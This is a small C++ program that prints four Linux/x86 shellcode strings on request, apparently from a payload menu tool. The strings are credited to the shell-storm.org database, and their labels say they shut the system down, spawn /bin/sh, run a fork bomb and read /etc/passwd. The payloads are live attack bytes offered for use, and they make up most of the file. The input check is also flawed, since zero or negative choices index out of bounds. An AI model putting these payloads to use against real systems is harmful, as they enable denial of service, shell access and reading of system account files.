#include <iostream>
#include <string>
#include <vector>
#include <regex>

/* shell codes for various commands have been taken from the http://shell-storm.org shellcode database */
using namespace std;

int main() {
	vector<string>shellcode = {R"(\x31\xc0\x31\xd2\x50\x66\x68\x2d\x68\x89\xe7\x50\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x77\x89\xe7\x50\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80)",R"(\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80)",R"(\x6a\x02\x58\xcd\x80\xeb\xf9)",R"(\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/passwd)"};

	int number;
	while(true) {
		std::cout << "Shellcode for what ?" <<std::endl;
		std::cout << "1. " << "Linux/x86 - command [shutdown -h now] " <<std::endl;
		std::cout << "2. " << "Linux/x86 - command execve bin/sh" <<std::endl;
		std::cout << "3. " << "Linux/x86 - command forkbomb" <<std::endl;
		std::cout << "4. " << "Linux/x86 - command read /etc/passwd file?" <<std::endl;
		cin >> number;
		if(number > shellcode.size()) {
			std::cout << "invalid input" << std::endl;
		}
		else
			std::cout << std::hex << shellcode[number-1] << std::endl;
		std::cout << "wanna continue \n 0. no \n 1. yes ?" << std::endl;
		int choice;
		cin >> choice;
		if(choice)
			continue;
		else 
			break;
	}
	return 0;
}
